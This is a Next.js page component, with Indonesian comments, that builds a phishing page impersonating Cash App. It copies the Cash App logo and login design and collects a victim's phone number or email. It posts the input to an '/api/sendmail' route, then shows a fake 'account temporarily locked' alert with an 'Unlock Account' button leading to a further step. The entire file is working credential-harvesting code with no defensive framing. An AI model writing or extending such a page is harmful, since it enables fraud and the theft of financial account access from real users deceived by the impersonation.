"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

export const metadata = { title: "Log in • Cash-style" };

// Format nomor telepon otomatis
function formatPhone(raw) {
  const digits = raw.replace(/\D/g, "").slice(0, 10);
  const len = digits.length;
  if (len === 0) return "";
  if (len < 4) return `(${digits}`;
  if (len < 7) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
  return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
}

export default function LoginPage() {
  const [useEmail, setUseEmail] = useState(false);
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [isDisabled, setIsDisabled] = useState(false);

  const router = useRouter();

  // handle phone input
  const handlePhoneChange = (e) => setPhone(formatPhone(e.target.value));
  const handlePhonePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text");
    setPhone(formatPhone(pasted));
  };
  const handlePhoneKeyDown = (e) => {
    const allowed = ["Backspace", "Delete", "ArrowLeft", "ArrowRight", "Home", "End", "Tab"];
    if ((e.ctrlKey || e.metaKey) && ["a", "c", "v", "x"].includes(e.key.toLowerCase())) return;
    if (allowed.includes(e.key)) return;
    if (!/^\d$/.test(e.key)) e.preventDefault();
  };

  // validasi tombol
  const isInvalid = useEmail ? email.trim() === "" : phone.trim().length < 14;

  // submit → kirim API lalu popup
 // submit → kirim API lalu popup
const handleSubmit = async (e) => {
  e.preventDefault();
  if (isInvalid || isDisabled) return;
  setIsDisabled(true);

  // Kirim hanya field yang dipilih
  const payload = useEmail ? { email } : { phone };

  try {
    const res = await fetch("/api/sendmail", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await res.json();

    if (data.success) {
      setShowPopup(true);
    } else {
      alert("Gagal mengirim data!");
    }
  } catch (err) {
    console.error(err);
    alert("Terjadi error saat kirim data");
  } finally {
    setIsDisabled(false);
  }
};

  // tombol unlock → redirect ke /login
  const handleUnlock = () => {
    setShowPopup(false);
    router.push("/login"); // step berikutnya
  };

  return (
    <div className="page">
      <header className="topbar">
        <a className="brand" href="#" aria-label="Cash App">
          <span className="brandIcon" aria-hidden>
            {/* Logo SVG dibiarkan */}
     <svg aria-label="Cash App Logo" role="img" width="148" height="32" viewBox="0 0 148 32" fill="none" xmlns="http://www.w3.org/2000/svg" data-testid="header-logo"><title>Cash App</title><path d="M48.8685 21.6076C50.56 21.6076 51.84 20.6324 52.3733 19.0019C52.4342 18.8038 52.6476 18.6971 52.8457 18.7581L55.0247 19.4895C55.2228 19.5504 55.3295 19.779 55.2533 19.9771C54.2476 22.659 52.0228 24.32 48.8685 24.32C44.5409 24.32 41.4019 20.8914 41.4019 16.0152C41.4019 11.1238 44.5409 7.71045 48.8685 7.71045C52.0228 7.71045 54.2476 9.3714 55.2533 12.0533C55.3295 12.2514 55.2228 12.4647 55.0247 12.5409L52.8457 13.2724C52.6476 13.3333 52.4342 13.2266 52.3733 13.0285C51.8247 11.3981 50.56 10.4228 48.8685 10.4228C46.3085 10.4228 44.4952 12.6324 44.4952 16.0152C44.4952 19.3981 46.3085 21.6076 48.8685 21.6076Z" fill="#000000"></path><path d="M63.6192 18.5752L61.1964 19.0781C60.1145 19.3067 59.2916 19.6571 59.2916 20.6476C59.2916 21.5162 59.9316 22.0038 60.9221 22.0038C62.3088 22.0038 63.6192 21.2724 63.6192 19.8857V18.5752ZM56.4116 20.8C56.4116 18.499 58.1945 17.5086 60.5259 17.0667L63.6192 16.4419V16.2438C63.6192 15.1771 63.0707 14.5219 61.6992 14.5219C60.5869 14.5219 59.9621 14.979 59.6421 15.8781C59.5811 16.0457 59.3983 16.1524 59.2154 16.1067L57.1888 15.68C56.9602 15.6343 56.8383 15.3905 56.9145 15.1771C57.6002 13.3943 59.2916 12.0381 61.8059 12.0381C64.7164 12.0381 66.4688 13.3943 66.4688 16.1219V21.0743C66.4688 21.6076 66.6516 21.8362 67.1088 21.8514C67.3069 21.8667 67.4745 22.019 67.4745 22.2171V23.7257C67.4745 23.9086 67.3373 24.0762 67.1392 24.0914C65.3716 24.259 64.3507 23.8628 63.9088 22.9486C63.1621 23.7867 61.943 24.259 60.404 24.259C58.1335 24.2895 56.4116 22.9028 56.4116 20.8Z" fill="#000000"></path><path d="M70.0188 20.419C70.1712 20.2819 70.415 20.2971 70.5522 20.4495C71.3446 21.3943 72.5941 21.9886 73.8131 21.9886C74.9103 21.9886 75.9007 21.6076 75.9007 20.6476C75.9007 19.6876 74.9712 19.5809 73.0969 19.2152C71.2074 18.8343 69.0893 18.3467 69.0893 15.8171C69.0893 13.6076 71.0246 12.0381 73.7979 12.0381C75.7179 12.0381 77.4398 12.8 78.3998 13.8971C78.5217 14.0495 78.5217 14.2628 78.3846 14.4L77.1046 15.68C76.9522 15.8324 76.7084 15.8324 76.5712 15.6648C75.8398 14.8267 74.8188 14.3543 73.676 14.3543C72.6246 14.3543 71.9541 14.8114 71.9541 15.5276C71.9541 16.3352 72.7769 16.4876 74.2398 16.7924C76.2665 17.219 78.7503 17.6609 78.7503 20.3581C78.7503 22.7809 76.5103 24.3048 73.7674 24.3048C71.7407 24.3048 69.6684 23.5733 68.5407 22.2171C68.4188 22.0648 68.4341 21.8514 68.5865 21.7143L70.0188 20.419Z" fill="#000000"></path><path d="M80.6245 7.95428H82.8036C83.0016 7.95428 83.1693 8.1219 83.1693 8.32V13.5162C83.8245 12.739 84.8912 12.0533 86.415 12.0533C88.8835 12.0533 90.3769 13.7448 90.3769 16.3048V23.7105C90.3769 23.9086 90.2093 24.0762 90.0112 24.0762H87.8321C87.634 24.0762 87.4664 23.9086 87.4664 23.7105V17.1429C87.4664 15.7562 86.9026 14.7505 85.4855 14.7505C84.3274 14.7505 83.1693 15.5886 83.1693 17.2038V23.7105C83.1693 23.9086 83.0016 24.0762 82.8036 24.0762H80.6245C80.4264 24.0762 80.2588 23.9086 80.2588 23.7105V8.32C80.2588 8.1219 80.4264 7.95428 80.6245 7.95428Z" fill="#000000"></path><path d="M100.968 17.8438H105.783L103.36 11.3829L100.968 17.8438ZM105.265 8.19809L111.055 23.5886C111.147 23.8324 110.964 24.0914 110.705 24.0914H108.373C108.221 24.0914 108.084 24 108.023 23.8476L106.773 20.5105H99.9923L98.758 23.8476C98.697 24 98.5599 24.0914 98.4075 24.0914H96.137C95.878 24.0914 95.6951 23.8324 95.7866 23.5886L101.577 8.19809C101.638 8.06095 101.775 7.95428 101.928 7.95428H104.929C105.067 7.95428 105.204 8.04571 105.265 8.19809Z" fill="#000000"></path><path d="M115.322 18.5295C115.322 20.6171 116.51 21.7904 118.095 21.7904C119.954 21.7904 120.96 20.3123 120.96 18.179C120.96 16.0457 119.954 14.5676 118.095 14.5676C116.51 14.5676 115.322 15.7257 115.322 17.8438V18.5295ZM115.383 22.8571V27.7333C115.383 27.9314 115.215 28.099 115.017 28.099H112.838C112.64 28.099 112.472 27.9314 112.472 27.7333V12.6476C112.472 12.4495 112.64 12.2819 112.838 12.2819H115.017C115.215 12.2819 115.383 12.4495 115.383 12.6476V13.5161C116.099 12.6476 117.226 12.0533 118.735 12.0533C122.011 12.0533 123.901 14.8419 123.901 18.179C123.901 21.5314 122.011 24.32 118.735 24.32C117.226 24.32 116.114 23.7257 115.383 22.8571Z" fill="#000000"></path><path d="M128.167 18.5295C128.167 20.6171 129.356 21.7904 130.941 21.7904C132.8 21.7904 133.805 20.3123 133.805 18.179C133.805 16.0457 132.8 14.5676 130.941 14.5676C129.356 14.5676 128.167 15.7257 128.167 17.8438V18.5295ZM128.228 22.8571V27.7333C128.228 27.9314 128.061 28.099 127.863 28.099H125.684C125.485 28.099 125.318 27.9314 125.318 27.7333V12.6476C125.318 12.4495 125.485 12.2819 125.684 12.2819H127.863C128.061 12.2819 128.228 12.4495 128.228 12.6476V13.5161C128.945 12.6476 130.072 12.0533 131.581 12.0533C134.857 12.0533 136.746 14.8419 136.746 18.179C136.746 21.5314 134.857 24.32 131.581 24.32C130.072 24.32 128.96 23.7257 128.228 22.8571Z" fill="#000000"></path><path fillRule="evenodd" clipRule="evenodd" d="M11.1596 0C7.94286 0 6.3421 0 4.61943 0.533029C2.72899 1.21844 1.2349 2.71116 0.548876 4.59977C0 6.336 0 7.93524 0 11.149V20.8358C0 24.0648 0 25.6488 0.533638 27.3851C1.21966 29.2738 2.71375 30.7663 4.60419 31.4517C6.3421 32 7.94286 32 11.1444 32H20.8404C24.0571 32 25.6579 32 27.3806 31.4517C29.271 30.7663 30.7651 29.2738 31.4511 27.3851C32 25.6488 32 24.0495 32 20.8358V11.1642C32 7.95048 32 6.35124 31.4511 4.61486C30.7651 2.72625 29.271 1.23368 27.3806 0.548267C25.6731 0 24.0876 0 20.8556 0H11.1596Z" fill="#00d64b"></path><path d="M17.3189 14.4389C20.6882 15.1548 22.2279 16.5559 22.2279 18.9167C22.2279 21.8716 19.8191 24.0495 16.0536 24.2932L15.6877 26.0448C15.6572 26.2123 15.5047 26.3342 15.3218 26.3342H12.4252C12.1813 26.3342 12.0136 26.1058 12.0594 25.8772L12.5167 23.9276C10.6567 23.3946 9.14736 22.3589 8.27848 21.0947C8.17181 20.9273 8.20229 20.7139 8.35467 20.5922L10.367 19.0082C10.5348 18.871 10.7786 18.9167 10.9007 19.0844C11.9678 20.5769 13.6143 21.4604 15.5963 21.4604C17.38 21.4604 18.7216 20.5923 18.7216 19.3434C18.7216 18.3839 18.0508 17.9421 15.7793 17.47C11.907 16.6324 10.3672 15.2159 10.3672 12.855C10.3672 10.1135 12.6692 8.05732 16.1451 7.78319L16.5263 5.97077C16.5567 5.8033 16.7093 5.6814 16.8921 5.6814H19.743C19.9717 5.6814 20.1546 5.89458 20.1089 6.12315L19.6668 8.1489C21.1609 8.60589 22.3804 9.42829 23.1428 10.4488C23.2647 10.6012 23.2342 10.8296 23.0818 10.9513L21.2371 12.4591C21.0693 12.5963 20.8408 12.5658 20.7187 12.3982C19.7735 11.2407 18.3099 10.5858 16.7091 10.5858C14.9253 10.5858 13.8125 11.3626 13.8125 12.4591C13.782 13.3879 14.6511 13.8601 17.3189 14.4389Z" fill="#ffffff"></path></svg>
         
          </span>
        </a>
      </header>

      <main className="center">
        <section className="panel" role="form" aria-labelledby="login-title">
          <h1 id="login-title" className="title">Log in</h1>
          <p className="subtitle">
            Enter your {useEmail ? "email" : "phone number"}. New to Cash App?{" "}
            <br />
            <a href="#" className="link">Create account</a>
          </p>

          {/* PAKAI handleSubmit */}
          <form onSubmit={handleSubmit} className="form">
            {useEmail ? (
              <>
                <label htmlFor="email" className="label">Email</label>
                <input
                  id="email"
                  type="email"
                  placeholder="name@email.com"
                  className="input single"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </>
            ) : (
              <>
                <label htmlFor="phone" className="label">Mobile number</label>
                <div className="phoneField">
                  <button type="button" className="country">
                    <span className="flag" aria-hidden>
                      {/* US flag SVG dibiarkan */}
              <svg width="32" height="18" viewBox="0 0 32 18" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Flag of United States."><g clipPath="url(#clip0)"><path d="M32 0H0V18H32V0Z" fill="#B22234"/><path d="M0 2.07666H32H0ZM32 4.84666H0H32ZM0 7.615H32H0ZM32 10.385H0H32ZM0 13.1533H32H0ZM32 15.9233H0H32Z" fill="black"/><path d="M32 16.615H0V15.23H32V16.615ZM32 13.8467H0V12.4617H32V13.8467ZM32 11.0767H0V9.69168H32V11.0767ZM32 8.30834H0V6.92334H32V8.30834ZM32 5.53834H0V4.15334H32V5.53834ZM32 2.77001H0V1.38501H32V2.77001Z" fill="white"/><path d="M13.68 0H0V9.69167H13.68V0Z" fill="#3C3B6E"/></g><rect x="0.5" y="0.5" width="31" height="17" stroke="black" strokeOpacity="0.05"/><defs><clipPath id="clip0"><rect width="32" height="18" fill="white"/></clipPath></defs></svg>

                    </span>
                    <span className="dial">+1</span>
                    <svg className="chev" viewBox="0 0 20 20" width="16" height="16" aria-hidden>
                      <path d="M5 7l5 6 5-6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                    </svg>
                  </button>
                  <input
                    id="phone"
                    type="tel"
                    inputMode="numeric"
                    autoComplete="tel"
                    placeholder="(123) 456-7890"
                    className="input"
                    value={phone}
                    onChange={handlePhoneChange}
                    onPaste={handlePhonePaste}
                    onKeyDown={handlePhoneKeyDown}
                    maxLength={14}
                    pattern="^\([0-9]{3}\) [0-9]{3}-[0-9]{4}$"
                    required
                  />
                </div>
              </>
            )}

            <div className="actions">
              <button
                type="button"
                className="btn ghost"
                onClick={() => setUseEmail(!useEmail)}
              >
                {useEmail ? "Use phone" : "Use email"}
              </button>
              <button 
                type="submit" 
                className="btn primary" 
                disabled={isInvalid || isDisabled}
              >
                {isDisabled ? "Sending..." : "Continue"}
              </button>
            </div>

            <p id="helper" className="helper">
              By entering and clicking Continue, you agree to the{" "}
              <u><b>Terms</b>, <b>E-Sign Consent</b>, &amp; <b>Privacy Policy</b>.</u>
            </p>
          </form>

          <div className="disclosures">
            {/* teks disclosures tetap */}
          </div>
        </section>
      </main>

      {/* POPUP */}
      {showPopup && (
        <div className="overlay">
          <div className="bg-white rounded-2xl shadow-xl max-w-sm w-full p-6 text-center">
            <div className="w-12 h-12 mx-auto mb-4 flex items-center justify-center bg-green-100 rounded-full">
              {/* Icon lock */}
        <svg fill="#09e10d" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" stroke="#09e10d" stroke-width="0.00512"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><title>ionicons-v5-g</title><path d="M368,192H192V112a64,64,0,1,1,128,0,16,16,0,0,0,32,0,96,96,0,1,0-192,0v80H144a64.07,64.07,0,0,0-64,64V432a64.07,64.07,0,0,0,64,64H368a64.07,64.07,0,0,0,64-64V256A64.07,64.07,0,0,0,368,192Z"></path></g></svg>

            </div>

            <h2 className="text-lg font-semibold mb-2">
              We detected something unusual.
            </h2>
            <p className="text-gray-600 mb-6 text-sm">
              To protect your funds, we’ve temporarily locked your account. <br />
              To unlock your account, please verify your email by clicking the
              button below.
            </p>

            <button
              onClick={handleUnlock}
              className="w-full py-3 rounded-xl bg-green-600 text-white font-bold hover:bg-green-700"
            >
              Unlock Account
            </button>
          </div>
        </div>
      )}

      <style jsx>{`
        :root{ --text:#0b0b0b; --muted:#6b6b6b; --green:#00C244; --border:#d7d7d7; --bg:#fff; }
        *{box-sizing:border-box}
        html,body,#__next,.page{height:100%}
        body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial}

        .page{background:var(--bg); color:var(--text)}

        .topbar{height:64px; display:flex; align-items:center}
        .brand{display:inline-flex; align-items:center; gap:10px; text-decoration:none; color:inherit; padding:12px 18px}

        .center{display:grid; place-items:start center; padding:48px 16px}
        .panel{width:100%; max-width:480px}

        .title{font-size:40px; line-height:1.1; margin:24px 0 8px}
        .subtitle{margin:0 0 24px; color:var(--muted)}
        .link{color:rgb(0, 214, 79); text-decoration:none; font-weight:600}

        .form{margin-top:8px}
        .label{font-size:14px; color:#444; font-weight:600; margin-bottom:8px; display:block}

        .phoneField{display:flex; align-items:center}
        .country{display:inline-flex; align-items:center; gap:8px; height:56px; padding:0 12px; border:2px solid var(--green); border-right:none; border-radius:12px 0 0 12px; background:#fff; color:#111; cursor:pointer}
        .flag{font-size:18px}
        .dial{font-weight:600}
        .chev{opacity:.7}

        .input{flex:1; height:56px; border:2px solid var(--green); padding:0 14px; font-size:16px; outline:none}
        .input.single{border-radius:12px; width:100%}
        .phoneField .input{border-radius:0 12px 12px 0}
        .input::placeholder{color:#a9a9a9}
        .input:focus{box-shadow:0 0 0 4px rgb(0, 214, 79)}

        .actions{display:flex; gap:16px; margin:24px 0}
        .btn{flex:1; height:48px; border-radius:999px; border:1px solid var(--border); font-weight:700; cursor:pointer}
        .btn.ghost{background:#f0f0f0}
        .btn.ghost:hover{background:#e9e9e9}
        .btn.primary{background:rgb(0, 214, 79); color:#fff; border-color:transparent}
        .btn.primary:disabled{
          background:#c5c5c5;
          cursor:not-allowed;
          opacity:0.7;
        }

        .helper{color:#4b4b4b; font-size:12.5px}
        .helper a{color:#111}

        .disclosures{margin-top:40px; color:#6a6a6a; font-size:13px; line-height:1.6}
        .disclosures p{margin:0 0 14px}

        @media(max-width:520px){.title{font-size:32px} .center{padding:24px 16px}}
       .overlay {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.6);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        .popup {
          background: #fff;
          border-radius: 16px;
          padding: 24px;
          width: 90%;
          max-width: 400px;
          text-align: center;
          box-shadow: 0 6px 20px rgba(0,0,0,0.2);
        }
        .popup h2 { margin: 0 0 12px; }
        .popup p { margin: 0 0 20px; }
      
      `}</style>
    </div>

  );
}
